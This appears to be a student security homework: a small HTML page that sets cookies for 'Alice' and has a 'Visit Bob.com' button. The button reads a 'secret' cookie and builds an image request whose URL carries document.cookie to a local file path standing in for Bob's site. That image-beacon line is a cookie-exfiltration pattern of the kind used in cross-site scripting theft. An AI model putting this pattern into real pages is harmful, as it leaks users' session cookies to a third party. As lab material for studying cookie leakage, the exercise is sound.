<html>
    <head>
        <script>
            function setCookie(cname, cvalue, exdays) {
                var d = new Date();
                d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
                var expires = "expires=" + d.toUTCString();
                document.cookie = cname + "=" + cvalue + ";" + expires
                + ";path=" + document.location.pathname;
            }
            function makeCookie() {
                setCookie("AliceCookie","myCoolCookie", 3);
                document.getElementById("d").textContent = document.cookie;
            }
            function getCookie(name) {
                var nameEQ = name + "=";
                var ca = document.cookie.split(';');
                for(var i=0;i < ca.length;i++) {
                    var c = ca[i];
                    while (c.charAt(0)==' ') c = c.substring(1,c.length);
                    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
                }
                return null;
            }
            function run ()
            {
                setCookie('Bobs','testcookie2',7);
                var i = document.createElement("img");
                i.src = "file:///home/ugc/kmwisnie/Desktop/Cpsc%20526/Homework%205/Bob.html";

                var x = getCookie('secret');
                document.write(x);

                var img = new Image();
                img.src = "file:///home/ugc/kmwisnie/Desktop/Cpsc%20526/Homework%205/Bob.html/c="+escape(document.cookie);
            }

        </script>
    </head>
<body onload="makeCookie()">
    Your cookie is <div id="d"></div>

    <button onclick="run()">
        Visit Bob.com
    </button>
</body></html>
